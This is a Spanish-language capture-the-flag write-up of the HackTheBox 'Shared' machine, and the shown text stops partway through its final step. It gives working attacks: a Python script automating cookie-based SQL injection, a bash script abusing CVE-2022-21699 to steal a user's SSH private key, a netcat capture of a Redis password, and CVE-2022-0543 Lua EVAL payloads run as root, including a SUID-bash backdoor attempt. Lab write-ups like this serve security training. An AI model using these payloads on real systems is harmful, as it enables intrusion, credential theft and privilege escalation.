---
title: Hackthebox Writeup Shared
date: 2022-08-15 16:21:11 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Medium, Python Scripting, Bash Scripting, SQLI, IPython, Redis, Lua, CVE-2022-21699, CVE-2022-0543]

img_path: /assets/img/htb/writeups/shared
---

## Overview:

1. Database enumeration and SSH password leak by **SQL Inyection**
2. **Remote command execution** in IPython **(CVE-2022-21699)** (Foothold)
3. **Redis password leak** exploiting a connection binary
4. **Remote command execution** by running Lua commands **(CVE-2022-0543)** (Privilege Escalation)

* * *

![SharedLogo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.172 |  23 Jul 2022 |   Medium   |   30   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.172
PING 10.10.11.172 (10.10.11.172) 56(84) bytes of data.
64 bytes from 10.10.11.172: icmp_seq=1 ttl=63 time=115 ms
                                          \______________________ Linux Machine
--- 10.10.11.172 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 114.710/114.710/114.710/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Con `nmap` realizamos un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir puertos abiertos:

```console
❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.172
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 16:33 -05
Nmap scan report for 10.10.11.172
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
		\_________________ Secure Shell Protocol
80/tcp  open  http
		\_________________ Hypertext Transfer Protocol
443/tcp open  https
		\_________________ Hypertext Transfer Protocol Secure
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Continuamos con un escaneo a profundidad de los puertos **22(SSH) - 80(HTTP) - 443(HTTPS)**:

> En esta ocasión usamos el formato **XML(Extensible Markup Language)** y con la herramienta `xsltproc` lo convertimos a formato **HTML(Hypertext Markup Language)**, luego compartimos un simple servidor HTTP:

```console
❯ nmap -p22,80,443 -sCV 10.10.11.172 -oX tcp_openPorts
...
❯ xsltproc tcp_openPorts -o tcp_openPorts.html
...
❯ python3 -m http.server 80
...
```

![TCPScan](tcp_ports_scan.png){: .shadow}

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sCV (Fusión de parámetros -sC -sV) 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oX \<file\> : Guardar el output del escaneo en un archivo con formato XML

Observamos que con el script por defecto `http-robots.txt` se encontro el clásico archivo _robots.txt_ el cuál se encarga de ocultar a los motores de búsqueda (google, firefox, bing) cierto contenido de nuestra web, ya sean directorios, subdirectorios, rutas, archivos, etc.

Ahora empezamos buscando las tecnologías del servicio web **80(HTTP)**:

> Usando `whatweb`

```console
❯ whatweb 10.10.11.172
http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://shared.htb - no address for shared.htb <---------- Virtual hosting
```

Observamos que se aplica **Virtual Hosting**, así que agregamos la IP de la máquina y el dominio a nuestro archivo encargado de la resolución de direcciones IP y nombres de dominio _/etc/hosts_: `echo "10.10.11.172 shared.htb" >> /etc/hosts`

Ahora volvemos a buscar las tecnologías:

```console
❯ whatweb 10.10.11.172
http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]
http://shared.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/], nginx[1.18.0]
https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

Por el lado de las tecnologías vemos un servidor web `Nginx/1.18.0` con una versión estable hasta la fecha, la biblioteca `JQuery` de `Javascript` para el tema de desarrollo web e interacción con documentos HTML, el E-commerce `Prestashop`, etc.

Aparte de ello observamos el flujo de redirecciones (3XX codes) _http://10.10.11.172 -> http://shared.htb -> https://shared.htb -> https://shared.htb/index.php_

> Para comprobarlo ingresamos con `Firefox`:

![HTTPWeb](http_web.png){: .shadow}

Al observar el landing page encontramos dos mensajes, uno sobre la caída de la página por un fallo de disco y otro de la implementación de un nuevo proceso de pago. Tengamos en cuenta lo anterior para más adelante

Toqueteando la página podemos encontrar una página de logeo, en mi caso no pude encontrarla de esa manera. Intente fuzear y solo encontré directorios con acceso prohibido (403 Forbidden), por ello realizé en un one-liner de `bash` la técnica **web scraping** para extraer todas las posibles rutas de la web:

```bash
❯ curl -sk https://shared.htb/index.php | grep -oE '"https:.*?"' | tr ' ' '\n' | tr ',' '\n' | grep -oE '"https:.*?"' | tr -d '"' | sort -u | sed 's/\\\//\//g' | grep -vE '^https://$' | sed 's/&amp;/\&/g'
...
https://shared.htb/index.php?controller=authentication <-------- Login path
...
```

Al crearnos una cuenta se nos agrega una nueva cookie de sessión con el nombre `custom_cart`, él cual si observamos en las herramientas de desarrollador (pestaña storage), el valor analizado es un **Array**. Llegando a la conclusión de que aquí guardará cada objeto que añadamos a nuestro carrito de compras.

> Antes de seguir, al comprar un producto podemos escribir un comentario al respecto y al querer publicarlo nos muestra un mensaje diciendo que será revisado por un moderador antes de publicarse. Pensando en ello podemos aplicar **XSS(Cross-Site Scripting)** para robarle las **cookies** a ese moderador y posiblemente tener una cuenta con mayores privilegios. Lamentablemente nunca llega a publicarse un comentario
{: .prompt-info}

Siguiendo con el carrito de compras, al momento de proceder con el pago existe una redirección a _https://checkout.shared.htb_. Realizamos el mismo paso de antes (saltamos la advertencia de "Not Secure") y observamos una tabla con el **ID** del producto y la cantidad que elegimos.

> Recordando la fase de descubrimiento de tecnologías, con la extensión [Wappalyzer](https://www.wappalyzer.com/apps/) observamos que por detrás hay una base de datos **MySQL**
{: .prompt-tip}

## Foothold

* * *

Sabemos que nuestra cookie `custom_cart` está codificada en formato **URL** y es reflejada en nuestro carro de compras:

> Podemos decodificar para validar el formato con `python` o `bash`:

```console
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: urldecode_data.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # python3
   2   │ alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
   3   │ 
   4   │ # bash
   5   │ echo "{url_data}" | sed -e "s/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g" | xargs -0 echo -e
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Al insertar la salida de cualquier comando comprobamos que no es necesario que la cookie este codificada

Con el concepto que por detrás hay una **base de datos MySQL** y la interfaz del carrito de compras es presentada como una tabla, podemos intentar una posible **SQL Inyeciton**

> Para mejor control interceptamos la página con `burpsuite`:

![CheckoutBurp](checkout_burpsuite.png){: .shadow}


> Probamos una comilla simple (') en cada campo de la cookie, para mejor entendimiento un **diccionario ({key : value})**:

En el campo value **1** solo se refleja el input, por ello podemos inyectar codigo **html** y posiblemente un ataque **XSS**

En el campo key **53GG2EF8**:

![ValidateKeySQLi](validate_key_sqli.png){: .shadow}

Tomamos la salida como un posible error e intentamos hallar la cantidad de columnas y un campo vulnerable:

![KeySQLi](key_sqli.png){: .shadow}

Ahora enumeramos las bases de datos existentes:

> Payload: `' union select 1,(select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata),3-- -`

![DBSqli](databases_sqli.png){: .shadow}

Los pasos que siguen son enumerar las **tablas, columnas y ver sus campos**:

```console
--Tables of a database
' union select 1,2,3,group_concat(0x7c,table_name,0x7C) from information_schema.tables where table_schema=[database]

--Column names
' union select 1,2,3,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name=[table name]
```

> Esta y más información lo encuentras en [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based)
{: .prompt-info}

Lo que hice fue automatizar el proceso en un script en `python`, muy parecida a la máquina anterior pero con algunos cambios nuevos:

```python
import argparse
import requests
import signal
import sys
import urllib.parse
import urllib3

# pip install beautifulsoup4 & pip instal lxml
from bs4 import BeautifulSoup
# pip3 install pwn
from pwn import *


# SQLi:
#	custom_cart = {"53GG2EF8' and false union select null,(select group_concat(0x7c, version(), 0x7c), null#":  "1"}

# global variables

domain_host = 'shared.htb'
subdomain_host = 'checkout'
target_host = f'https://{subdomain_host}.{domain_host}'

# disable TLS warnings

urllib3.disable_warnings()

# ctrl C

def def_handler(signal, frame):
	log.failure('Aborted!')
	exit()

signal.signal(signal.SIGINT, def_handler)

# inyection types

def get_databases():
	return """' and false union select null, (select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata), null#"""

def get_tables(database):
	return f"""' and 1=0 union select null, (select group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = '{database}'), null#"""

def get_columns(table):
	return f"""' and 0 union select null, (select group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = '{table}'), null#"""

def get_fields(column, table):
	return f"""' and 1>2 union select null, (select group_concat(0x7c, {column}, 0x7c) from {table}), null#"""

def get_info(query):
	return f"""' and 2=1 union select null, (select group_concat(0x7c, {query}, 0x7c)), null#"""

# selection of query types

def type_inyection(args):
    try:
        if len(sys.argv) == 1:
            return get_databases()
        elif args.database and args.table and args.column:
            return get_fields(args.column, args.table)
        elif args.database and args.table:
            return get_columns(args.table)
        elif args.database:
            return get_tables(args.database)
        elif args.query:
            return get_info(args.query)
    except Exception as e:
        print(e)


# request for inyection

def request(args):
	with requests.Session() as s:

		# select inyection type
		inyection = type_inyection(args)

		# Hummingbird printed t-shirt ID (cookie value)
		# add inyection
		product_id = f"""53GG2EF8{inyection}"""
		cookie_value = '{"' + product_id + '":"1"}'

		# urlencode cookie value
		urlcode_cookie = urllib.parse.quote(cookie_value)

		# create cookie
		malicious_cookie = { 
			"custom_cart" : urlcode_cookie
		}

		# inyect cookie
		r = s.get(f'{target_host}', cookies=malicious_cookie, verify=False)
		
		# show information
		soup = BeautifulSoup(r.text, 'lxml')
		print()
		print(soup.td.string)

# program flow

def main(args):
	request(args)

if __name__ == '__main__':

	# Help panel 
	parser = argparse.ArgumentParser(description='SQLi Shared HTB')
	
	parser.add_argument('-d', '--database', type=str, required=False, help='Select database')
	parser.add_argument('-t', '--table', type=str, required=False, help='Select table')
	parser.add_argument('-c', '--column', type=str, required=False, help='Select column')
	parser.add_argument('-q', '--query', type=str, required=False, help='One word query (g.e version())')

	args = parser.parse_args()

	# pass args object
	main(args)
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Shared/sql_inyection.py)
{: .prompt-info}

```console
❯ python3 sql_inyection.py

|information_schema|,|checkout|
❯ python3 sql_inyection.py -d checkout

|user|,|product|
❯ python3 sql_inyection.py -d checkout -t user

|id|,|username|,|password|
❯ python3 sql_inyection.py -d checkout -t user -c username

|james_mason|
❯ python3 sql_inyection.py -d checkout -t user -c password

|fc895d4eddc2fc12f995e18c865cf273|
```

Al ejecutar el codigo obtenemos el usuario `james_mason` y su contraseña en formato **hash**, para ello podemos usar las herramientas `hashid` o `hash-identifier` para identificar el tipo de hash y luego poder crackearla. En esta oportunidad usamos la página **https://crackstation.net/**, la cuál halla la contraseña en unos segundos:

![CRACKSTATION](crackstation_hash.png){: .shadow}

> Plataforma legal para crackear contraseñas [https://crackstation.net/](https://crackstation.net/)

Ahora con la contraseña y recordando que tenemos el puerto **22(SSH)** abierto, entramos con las credenciales obtenidas como el usuario `james_mason`:

```console
❯ ssh james_mason@10.10.11.172
james_mason@10.10.11.172's password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 15 21:11:13 2022 from 10.10.14.54
james_mason@shared:~$ whoami
james_mason
james_mason@shared:~$ find / -name user.txt 2>/dev/null | xargs ls -l
-rw-r----- 1 root dan_smith 33 Aug 14 18:28 /home/dan_smith/user.txt
```

Ya dentro nos damos cuenta que no tenemos permiso para leer la flag, el archivo tiene los permisos `rw-r-----` lo cuál solo permite leer el archivo al usuario `root` y los que pertecen al grupo `dan_smith`, entonces es nuestro objetivo

Antes de eso buscamos el código **php** no sanitizado que nos permitió **SQL Inyection**:

```console
james_mason@shared:~$ cat /var/www/checkout.shared.htb/index.php | grep sql
    $conn = new mysqli(DBHOST, DBUSER, DBPWD, DBNAME);
            $sql = "SELECT id, code, price from product where code='".$code."'"; <-------- query concatenation (typical error)
            // Prevent time-based sql injection
            if(strpos(strtolower($sql), "sleep") !== false || strpos(strtolower($sql), "benchmark") !== false)
            $result = $conn->query($sql);
            if($result && mysqli_num_rows($result) >= 1) {
                $product = mysqli_fetch_assoc($result);
```

Empezamos haciendo un reconocimiento básico del sistema y encontramos con el comando `id` (información de usuario y grupo) que nuestro usuario pertenece al grupo `1001(developer)`, además listamos que ambos usuarios pertenecen al mismo grupo (una manera de combinar a los usuarios), y el **uid(1001)** pertenece al usuario `dan_smith`:

```console
james_mason@shared:~$ grep 1001 /etc/group
developer:x:1001:james_mason,dan_smith  <-------------- Same group
james_mason@shared:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash <-------- !
```

Con esa información buscamos directorios y archivos con los permisos _Group id_ **gid(1001)**:

```console
james_mason@shared:~$ find / -group developer 2>/dev/null
/opt/scripts_review
```
> La ruta `/opt` esta reservado para almacenar paquetes de distintos softwares (terceros) que no son parte del sistema
{: .prompt-info}

Encontramos la ruta _/opt/scripts_review_ pero sin ningún contenido. Buscando **archivos ocultos** en el directorio del usuario `dan_smith` _/home/dan_smith_ encontramos el directorio _.ipython_, pero que es eso?

![IPYTHONDEF](ipython_definition.png){: .shadow}

Probamos usar la shell interactiva y todo funciona correctamente, y además nos muestra la versión `IPython 8.0.0`. Sin dudarlo intentamos buscar una vulnerabilidad sobre dicha versión y logramos encontrar una interesante:

![CVE-2022-21669](cve-2022-21669.png){: .shadow}

> Más información y explotación [CVE-2022-21669](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x)
{: .prompt-info}

En resumen, podemos ejecutar comandos como otro usuario. Te explico en que consiste:

> Al usar esta shell de python existe una configuración y se guarda en la ruta `~/.ipython/profile_default` (ruta que tenemos en el directorio del usuario `dan_smith`)

> Dentro de la ruta anterior existe un directorio `/startup`, el cuál al iniciar `ipython` ejecutará todos los scripts _.py_ ó _.ipy_ que tiene almacenados (puedes ver esta información en el archivo README)

> Documentación **IPython** [https://ipython.readthedocs.io/en/stable/interactive/tutorial.html#startup-files](https://ipython.readthedocs.io/en/stable/interactive/tutorial.html#startup-files)
{: .prompt-info}

Ahora solo nos queda buscar que el usuario `dan_smith` pueda ejecutar el comando `IPython`, y para conseguir eso usamos la herramienta `pspy` para encontrar procesos de otros usuarios:

> Descargan la herramienta en su repositorio, lo pasan a la máquina víctima, le dan permisos de ejecución y lo ejecutan

```console
james_mason@shared:/tmp$ ./pspy64                                                                                                                                  [222/222]
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855         
                                                                                                                                                                            
                                                                                                                                                                            
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                                     
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                                                     
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                               
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                                                     
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                                     
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                                      
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                                                      
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                                                       
                   ░           ░ ░                                                    
                               ░ ░         
...
2022/08/16 01:45:01 CMD: UID=1001 PID=2302   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython <--- Important!
				\___ dan_smith UID 
2022/08/16 01:45:01 CMD: UID=1001 PID=2303   | /usr/bin/pkill ipython 
2022/08/16 01:45:01 CMD: UID=1001 PID=2304   | /usr/bin/python3 /usr/local/bin/ipython
...
```

> Repositorio de la herramienta [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
{: .prompt-info}

Interesante, vemos que el usuario `dan_smith` (lo reconocemos por su UID) usa `pkill` para cancelar la ejecución de **IPython**, luego con `cd` va al directorio que vimos anteriormente y con el simbolo lógico `&&` ejecuta ipython si el comando anterior fue exitoso (el cuál pasará ya que sabemos la existencia de esa ruta)

Entonces con todo lo visto anteriormente procedemos a explotar la vulnerabilidad:

> Concepto general (Vulnerable user)

```console
mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/foo.py
```

Para la explotación, pruebas y por si cometemos errores, de manera rápida lo metemos en un archivo para usarlo como un script en `bash` e intentar copiar la `id_rsa` **Private key** de `dan_smith`, ya que se dirigirá a la ruta _/opt/scripts_review_ y allí ejecutara `ipython`, el cuál buscara el directorio de inicicialización `/startup` y ejecutará los scripts almacenados dentro `00-wh0am1.py` (stealing private key):

```bash
target_path='/opt/scripts_review'
temp_path='/tmp/.testing'

# create temp file 
if [ -d $temp_path ]; then
        rm -r $temp_path
fi

mkdir -m 777 $temp_path

# If target_path not is empty
if [ ! -z "$(ls -A $target_path)" ]; then
        rm -r $target_path/*
else
        mkdir -m 777 $target_path/profile_default
        mkdir -m 777 $target_path/profile_default/startup

        echo "__import__('os').system('cat ~/.ssh/id_rsa > /tmp/.testing/id_rsa; chmod o+rwx /tmp/.testing/id_rsa')" > $target_path/profile_default/startup/00-wh0am1.py
fi

# ssh connection
sleep 20 # wait until to receive key
ssh -i $temp_path/id_rsa dan_smith@localhost
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Shared/CVE-2022-21699.sh)
{: .prompt-info}

Ahora lo ejecutamos, esperamos unos segundos, nos logeamos como `dan_smith` y conseguimos la flag:

```console
james_mason@shared:/tmp$ ./CVE-2022-21699.sh
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 16 03:19:09 2022 from 127.0.0.1
dan_smith@shared:~$ whoami
dan_smith
dan_smith@shared:~$ find / -name user.txt 2>/dev/null | xargs ls -l
-rw-r----- 1 root dan_smith 33 Aug 16 00:52 /home/dan_smith/user.txt
```

## Privilege Escalation

* * *

Al igual que con el usuario anterior, hacemos una enumeración básica de nuestro usuario y nos damos cuenta que pertenece al grupo `1003(sysadmin)`, entonces buscamos directorios y archivos con ese **GUI (Group ID)**:

```console
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:~$ find / -group 1003 2>/dev/null
/usr/local/bin/redis_connector_dev
```

En contramos el binario __/usr/local/bin/redis_connector_dev__, lo ejecutamos y nos muestra lo siguiente:

```console
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:27580
run_id:52a282d2b4b882075ba776fde63771afa60e80cf
tcp_port:6379
uptime_in_seconds:5
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:16525803
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

Nos muestra un mensaje que se esta logeando a `redis`. **Redis** es un motor de base de datos en memoria que almacena la información de la forma **clave-valor**

Entonces como nos muestra la versión intentamos encontrar algunar vulnerabilidades, encontramos varias, pero para poder ejecutarlas necesitabamos autenticarnos en la interfaz de redis con `redis-cli`

Nuestro objetivo ahora es lograr authenticarnos. Si nos fijamos bien, el binario anterior __/usr/local/bin/redis_connector_dev__ nos muestra el mensaje **[+] Logging to redis instance using password...**. Al parecer al ejecutar el script, este se intenta conectar a `redis` y al entablar la conexión se autentica y recibimos ese output de informmación. ¿ Pero en qué puerto ?, sencillo, el puerto por defecto de `redis` es el **6379**

> Listamos los puertos

```console
dan_smith@shared:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6379 <- Here! 0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                
```

Encontramos que está en escucha pero solo de manera local (127.0.0.1 loopback addres). Entonces como no podemos interceptar el binario de manera externa, por ello pasamos el binario a nuestra máquina y lo ejecutamos:

```console
❯ chmod +x redis_connector_dev
❯ ./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 dial tcp 127.0.0.1:6379: connect: connection refused
─────────────────────────────────────────────────────────────────────
```

Al ejecutarlo nos sale un error de conexión rechazada sobre **127.0.0.1:6379**, lo que pasa es que el binario está intentando ingresar a `redis` por el puerto **6379**

Entonces lo que hacemos es abrir el puerto **6379** para esperar esa conexión y recibir la contraseña de la autenticación:

```console
❯ chmod +x redis_connector_dev
❯ ./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 dial tcp 127.0.0.1:6379: connect: connection refused <------- Connection failed (1)
❯ ./redis_connector_dev
[+] Logging to redis instance using password...       <------- Successfull connection (3)

INFO command result:
 i/o timeout

──────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 6379					     <-------- Open port (2)
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6379
Ncat: Listening on 0.0.0.0:6379
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:51178.
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq <------- Password
```

Al conectarnos vemos varios simbolos, pues esto se debe a que los clientes `redis` usan el protocolo **RESP(REdis Serialization Protocol)** para comunicarse con el servidor. Cuando se realiza la petición, estos datos se trasmiten como un **arreglo de strings**, aquí la explicación de los símbolos:

![RESPProtocol](resp_protocol.png){: .shadow}

> Más informacions sobre [RESP protocol](https://redis.io/docs/reference/protocol-spec/)
{: .prompt-info}

Como ya tenemos una autenticación exitosa, ahora toca intentar explotar distintas vulnerabilidades que existen para `redis`

Usamos como fuente la biblia de los Hacker **Hacktricks**, en mi caso solo me funcionó usar la forma **Lua sandbox byass**, especificamente **CVE-2022-0543** que consiste en poder insertar código **Lua** (lenguaje que aporta al funcionamiento de `Redis`) a traves del comando **EVAL** y con ello ejecutar código remoto

Antes tenemos que verificar que este proceso está siendo ejecutado como el usuario privilegiado, así que listamos rápidamente los procesos del sistema y confirmamos que el  usuario `root` es quien está iniciando el servidor `redis`:

```console
dan_smith@shared:/tmp$ ps aux
...
root       30024  0.2  0.7  65104 14664 ?        Ssl  21:13   0:00 /usr/bin/redis-server 127.0.0.1:6379 <----- Root
dan_smi+   30030  0.0  0.1   9700  3192 pts/2    R+   21:13   0:00 ps aux
```

Ahora procedemos a la explotación:

> Código `lua` que useremos

```lua
# Guardamos en una variable el nombre de inicialización del paquete Lua que usaremos
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); 

# Inicializamos el paquete guardándolo en una variable
local io = io_l();

# Accedemos a la función 'popen' que nos permite ejecutar comandos {command} mostrando como output un archivo
local f = io.popen("{command}", "r"); 

# Leemos el archivo y guardamos su contenido
local res = f:read("*a"); 

# Cerramos el archivo
f:close(); 

# Retornamos la salida del comando
return res
```

> Entramos a la interfaz de redis `redis-cli` y usando el comando **EVAL** ejecutamos el script anterior con el comando `whoami`:

```console
dan_smith@shared:/tmp$ redis-cli -a F2WHqJUz2WEz=Gqq
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res' 0
"root\n"
127.0.0.1:6379> 
```

> El '0' del final indica que no pasamos ningún argumento al script
{: .prompt-info}

Conseguimos ejecutar comandos como el usuario `root`, ahora tenemos que buscar una manera ganar acceso completo a una shell

> Intentamos asignarle permisos **SUID** a la bash pero no logramos que funcione

```console
127.0.0.1:6379>  EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("chmod u+s /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
""
127.0.0.1:6379>  EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -l /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
"-rwxr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\n"
```

Pero existe otra alternativa, al listar lo procesos del sistema con la herramienta `pspy` encontramos que el usuario `root` ejecuta el siguiente script:

```console
2022/08/16 22:44:01 CMD: UID=0    PID=32279  | /bin/bash /root/c.sh 
2022/08/16 22:44:01 CMD: UID=0    PID=32280  | sleep 5 
2022/08/16 22:44:01 CMD: UID=1001 PID=32281  | /usr/bin/python3 /usr/local/bin/ipython 
2022/08/16 22:44:06 CMD: UID=0    PID=32283  | rm -rf /opt/scripts_review/* 
2022/08/16 22:44:06 CMD: UID=0    PID=32286  | perl -ne s/\((\d+)\)/print " $1"/ge 
2022/08/16 22:44:06 CMD: UID=0    PID=32285  | /bin/bash /root/c.sh 
2022/08/16 22:44:06 CMD: UID=0    PID=32284  | /bin/bash /root/c.sh
```

Observamos varios veces la ejecución del script `c.sh`, el cuál es una tarea **cron** que se ejecutará cada cierto tiempo. Entonces aplicamos lo mismo que antes y agregamos con el operador `>>` el comando `chmod u+s /bin/bash`:

> Para evitar problemas de sintáxis con los simbolos codificamos el comando en `base64`

```console
❯ echo "echo 'chmod u+s /bin/bash' >> /root/c.sh" | base64
ZWNobyAnY2htb2QgdStzIC9iaW4vYmFzaCcgPj4gL3Jvb3QvYy5zaAo=
```

Ahora pasamos la cadena y lo decodificamos de vuelta para luego interpretarla con bash:

```console
127.0.0.1:6379>  EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -l /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
"-rwxr-xr-x 1 root root 1234376 Mar 27 14:40 /bin/bash\n"
